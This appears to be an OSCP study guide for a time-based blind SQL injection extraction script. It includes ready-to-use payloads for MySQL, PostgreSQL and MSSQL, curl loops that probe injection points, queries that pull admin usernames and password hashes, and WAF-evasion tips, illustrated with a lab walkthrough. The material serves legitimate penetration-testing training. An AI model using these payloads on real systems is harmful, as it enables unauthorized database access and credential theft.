# Time-Based SQL Injection Methodology - OSCP Exam Guide

## Tool Overview
**Script:** `time_sqli_extractor.sh`
**Purpose:** Educational tool for mastering time-based SQL injection exploitation
**Exam Relevance:** Critical for OSCP when error/union-based injections fail

---

## Quick Start Guide

### Basic Usage
```bash
# Make script executable
chmod +x time_sqli_extractor.sh

# Basic POST injection
./time_sqli_extractor.sh \
    -u http://192.168.145.48/index.php \
    -p "mail-list" \
    -i "test' AND IF({CONDITION},SLEEP(2),0)-- -"

# GET injection
./time_sqli_extractor.sh \
    -u http://192.168.145.48/page.php \
    -p "id" \
    -m GET \
    -i "1 AND IF({CONDITION},SLEEP(3),0)"
```

---

## Understanding Time-Based SQL Injection

### When to Use Time-Based SQLi
1. **No visible errors** - Application suppresses error messages
2. **No output differences** - True/false conditions look identical
3. **Blind exploitation** - Can't see query results directly
4. **Last resort** - When UNION and error-based fail

### How It Works
```sql
-- If condition is TRUE: delays response by X seconds
SELECT * FROM users WHERE id=1 AND IF(1=1,SLEEP(2),0)

-- If condition is FALSE: immediate response
SELECT * FROM users WHERE id=1 AND IF(1=2,SLEEP(2),0)
```

---

## Binary vs Linear Search - Critical Performance Difference

### Linear Search (Inefficient)
```bash
# Testing each character individually: a,b,c,d...z,A,B...Z,0,1...9
# Average: 37 requests per character
# 10-character password: ~370 requests, ~12 minutes
```

### Binary Search (Optimal)
```bash
# Using ASCII values with binary search
# Maximum: 7 requests per character
# 10-character password: ~70 requests, ~2 minutes

# How binary search works:
# Range: 32-126 (printable ASCII)
# Test middle value: 79
# If > 79: search 80-126
# If <= 79: search 32-79
# Repeat until found
```

### Performance Comparison
| Method | Requests/Char | Time for 32-char hash | OSCP Impact |
|--------|---------------|------------------------|-------------|
| Linear | ~37 | 20-25 minutes | Too slow for exam |
| Binary | ~7 | 3-4 minutes | Exam viable |
| Hex-only Binary | ~4 | 2-3 minutes | Best for hashes |

---

## Extraction Modes Explained

### 1. Automatic Mode (Default)
```bash
./time_sqli_extractor.sh -u URL -p PARAM -i INJECTION

# Automatically enumerates:
# - Current database
# - MySQL version
# - Tables in database
# - Columns in tables
# - Data extraction
```

### 2. Manual Mode (Interactive)
```bash
./time_sqli_extractor.sh -u URL -p PARAM -i INJECTION -M manual

# Commands:
extract SELECT USER()
extract SELECT password FROM users LIMIT 0,1
test LENGTH(DATABASE())>5
enum tables animal_planet
stats
```

### 3. Binary Mode (Fastest)
```bash
./time_sqli_extractor.sh -u URL -p PARAM -i INJECTION -M binary

# Prompts for specific query
# Uses binary search exclusively
```

### 4. Linear Mode (Educational)
```bash
./time_sqli_extractor.sh -u URL -p PARAM -i INJECTION -M linear

# Shows why binary is superior
# Useful for understanding concepts
```

---

## Common Injection Patterns

### MySQL
```sql
-- Boolean condition with sleep
' AND IF({CONDITION},SLEEP(2),0)-- -
' AND IF({CONDITION},BENCHMARK(5000000,MD5('test')),0)-- -

-- Without quotes
1 AND IF({CONDITION},SLEEP(2),0)

-- UPDATE/INSERT contexts
',description=(SELECT IF({CONDITION},SLEEP(2),0)))-- -
```

### PostgreSQL
```sql
-- Uses pg_sleep
' AND CASE WHEN {CONDITION} THEN pg_sleep(2) ELSE pg_sleep(0) END-- -
```

### MSSQL
```sql
-- Uses WAITFOR DELAY
'; IF {CONDITION} WAITFOR DELAY '00:00:02'-- -
```

---

## Step-by-Step Exploitation Workflow

### 1. Confirm Injection Point
```bash
# Test with always-true condition
curl -X POST http://target.com/index.php \
    -d "param=test' AND IF(1=1,SLEEP(2),0)-- -" \
    -w "Time: %{time_total}s\n"

# Should delay ~2 seconds
```

### 2. Find Database Name
```bash
# Using the tool
./time_sqli_extractor.sh -u URL -p PARAM -i INJECTION
# Select: extract SELECT DATABASE()

# Manual method
# First find length
for i in {1..20}; do
    curl -X POST http://target.com/index.php \
        -d "param=test' AND IF(LENGTH(DATABASE())=$i,SLEEP(2),0)-- -" \
        -w "Length $i: %{time_total}s\n"
done
```

### 3. Enumerate Tables
```bash
# Count tables first
SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='dbname'

# Extract each table name
SELECT table_name FROM information_schema.tables
WHERE table_schema='dbname' LIMIT 0,1
```

### 4. Extract Credentials
```bash
# Username
SELECT username FROM dbname.users LIMIT 0,1

# Password (often hashed)
SELECT password FROM dbname.users LIMIT 0,1
```

---

## Optimization Techniques

### 1. Parallel Requests (Advanced)
```bash
# Run multiple position extractions simultaneously
for pos in {1..10}; do
    (./extract_position.sh $pos &)
done
wait
```

### 2. Character Set Optimization
```bash
# For hex-encoded hashes (0-9,a-f only)
# Reduces search space from 95 to 16 characters

# For usernames (likely lowercase + numbers)
# Reduces search space to ~37 characters
```

### 3. Caching Common Strings
```bash
# Cache discovered values
echo "admin:5f4dcc3b5aa765d61d8327deb882cf99" >> known_creds.txt

# Check cache before extracting
grep "^$username:" known_creds.txt
```

---

## Troubleshooting Guide

### Issue: No delay detected
```bash
# Solutions:
1. Increase delay time: -d 5
2. Check network latency
3. Try different sleep functions (BENCHMARK, pg_sleep)
4. Verify injection syntax
```

### Issue: Inconsistent results
```bash
# Solutions:
1. Add tolerance to timing checks
2. Increase delay to compensate for network jitter
3. Run multiple confirmations per character
```

### Issue: WAF blocking requests
```bash
# Solutions:
1. Use time-based alternatives (heavy queries)
2. Encode payloads (URL encode, hex)
3. Vary request timing
4. Change User-Agent headers
```

---

## OSCP Exam Tips

### Time Management
- **Budget 30 minutes** for time-based extraction
- **Set character limits** - don't extract 100-char strings
- **Prioritize targets** - admin credentials first

### Efficiency Strategies
1. **Always use binary search** - 5x faster than linear
2. **Extract only what you need** - usernames and passwords
3. **Cache discoveries** - don't re-extract known values
4. **Monitor progress** - use verbose mode to track efficiency

### Documentation
```bash
# Log all successful extractions
./time_sqli_extractor.sh ... | tee sqli_extraction.log

# Document the working payload
echo "Working payload: test' AND IF({CONDITION},SLEEP(2),0)-- -" > breakthrough.md

# Screenshot critical moments
# - Successful injection confirmation
# - Extracted credentials
# - Admin access achieved
```

---

## Real-World Example from Lab

### Animal Planet Database (Capstone)
```bash
# 1. Confirmed injection point
POST /index.php
mail-list=test' AND IF(1=1,SLEEP(2),0)-- -
Result: 2.3 second delay ✓

# 2. Found database name
DATABASE(): animal_planet (14 chars, ~98 requests)

# 3. Enumerated tables
Tables: failed_logins, users (2 tables found)

# 4. Extracted admin credentials
Username: admin (5 chars, ~35 requests)
Password: {MD5_HASH} (32 chars, ~224 requests with hex optimization)

Total time: ~5 minutes
Total requests: ~357
```

---

## Manual Exploitation Reference

### Quick ASCII Reference
```
32-47:  Special chars (space ! " # $ % & ' ( ) * + , - . /)
48-57:  0-9
58-64:  Special chars (: ; < = > ? @)
65-90:  A-Z
91-96:  Special chars ([ \ ] ^ _ `)
97-122: a-z
123-126: Special chars ({ | } ~)
```

### Common ASCII Values
```
32: space    65: A       97: a
45: -        90: Z       122: z
46: .        48: 0       95: _
64: @        57: 9       36: $
```

---

## Advanced Techniques

### 1. Multi-Threading Extraction
```bash
# Create position extraction function
extract_position() {
    local pos=$1
    ./time_sqli_extractor.sh ... -M binary \
        -Q "SELECT SUBSTRING((SELECT password FROM users LIMIT 0,1),$pos,1)"
}

# Run in parallel
for pos in {1..32}; do
    extract_position $pos &
done
wait
```

### 2. Conditional Extraction
```bash
# Only extract if admin exists
if test_condition "SELECT COUNT(*) FROM users WHERE username='admin'=1"; then
    extract_string "SELECT password FROM users WHERE username='admin'"
fi
```

### 3. Fuzzy Timing (Anti-WAF)
```bash
# Randomize delay between 2-4 seconds
DELAY=$((2 + RANDOM % 3))
```

---

## Complete Command Reference

### Tool Flags
```bash
-u URL          # Target URL
-p PARAM        # Vulnerable parameter
-i INJECTION    # Injection template with {CONDITION}
-m METHOD       # HTTP method (GET/POST)
-d DELAY        # Sleep delay in seconds
-c COOKIE       # Cookie header
-H HEADERS      # Additional headers
-M MODE         # Extraction mode
-L LENGTH       # Max string length
-v              # Verbose output
-q              # Quiet mode
```

### Usage Examples
```bash
# Basic POST injection
./time_sqli_extractor.sh \
    -u http://192.168.145.48/index.php \
    -p "mail-list" \
    -i "test' AND IF({CONDITION},SLEEP(2),0)-- -"

# GET with cookie
./time_sqli_extractor.sh \
    -u http://192.168.145.48/page.php \
    -p "id" \
    -m GET \
    -c "PHPSESSID=abc123" \
    -i "1 AND IF({CONDITION},SLEEP(3),0)"

# Manual mode for custom queries
./time_sqli_extractor.sh \
    -u http://192.168.145.48/index.php \
    -p "mail-list" \
    -i "test' AND IF({CONDITION},SLEEP(2),0)-- -" \
    -M manual

# Extract specific data
./time_sqli_extractor.sh \
    -u http://192.168.145.48/index.php \
    -p "mail-list" \
    -i "test' AND IF({CONDITION},SLEEP(2),0)-- -" \
    -M binary
# Then enter: SELECT password FROM animal_planet.users WHERE username='admin'
```

---

## Key Takeaways for OSCP

1. **Time-based SQLi is slow but reliable** - Works when nothing else does
2. **Binary search is mandatory** - Linear is too slow for exam time limits
3. **Document everything** - Working payloads are gold
4. **Optimize character sets** - Hex for hashes, lowercase for usernames
5. **Cache discoveries** - Don't extract the same data twice
6. **Monitor efficiency** - Track requests/character ratio
7. **Have a backup plan** - Sometimes Heavy query alternatives work better

---

## Remember for Exam Day
- This tool is **educational** - understand the methodology
- Practice **manual extraction** - tools may not be available
- Keep **timing logs** - know how long extractions take
- **Screenshot everything** - especially successful extractions
- Create **methodology notes** - what worked and why

Good luck on your OSCP journey! 🎯